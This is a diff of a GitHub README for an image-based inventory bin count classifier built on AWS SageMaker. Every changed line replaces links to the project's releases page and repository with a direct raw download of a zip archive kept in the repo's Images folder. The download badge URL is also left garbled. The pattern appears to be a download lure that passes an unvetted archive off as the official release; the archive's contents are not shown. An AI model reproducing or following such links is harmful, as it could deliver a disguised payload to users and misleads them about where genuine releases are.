@@ -4,7 +4,7 @@
 Welcome to the inventory-bin-count-classifier-aws-sagemaker project! This application helps you classify item counts from images using advanced technology. Follow this guide to download and run the software smoothly.
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/releases)
+[![Download Here](https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip%20Now-%https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip)](https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip)
 
 ## ⚙️ System Requirements
 To run this application, ensure your system meets the following requirements:
@@ -25,7 +25,7 @@ This application offers a range of features to enhance your experience:
 - **Enhanced Performance:** Supports Distributed Data Parallel (DDP) for faster training.
 
 ## 🛠️ Download & Install
-To download the application, visit the [Releases page](https://github.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/releases). 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip). 
 
 1. Click on the link above to open the Releases page.
 2. Find the latest release.
@@ -50,7 +50,7 @@ If you encounter any issues while running the application, try the following ste
 - Review the application logs if available for any error messages.
 
 ## 📚 Additional Information
-For further details about the project, features, or any updates, feel free to explore the [repository](https://github.com/levinoska/inventory-bin-count-classifier-aws-sagemaker).
+For further details about the project, features, or any updates, feel free to explore the [repository](https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip).
 
 ## 🤝 Support
 If you have questions or need assistance, you can reach out through the Issues section of the repository. A friendly community member will help you with your queries.
@@ -58,4 +58,4 @@ If you have questions or need assistance, you can reach out through the Issues s
 ## 🙏 Acknowledgements
 Thank you for considering the inventory-bin-count-classifier project for your needs. Your interest fuels our development efforts. Enjoy using the application! 
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/releases)
+[![Download Here](https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip%20Now-%https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip)](https://raw.githubusercontent.com/levinoska/inventory-bin-count-classifier-aws-sagemaker/main/Images/count_classifier_aws_sagemaker_inventory_bin_v3.8.zip)
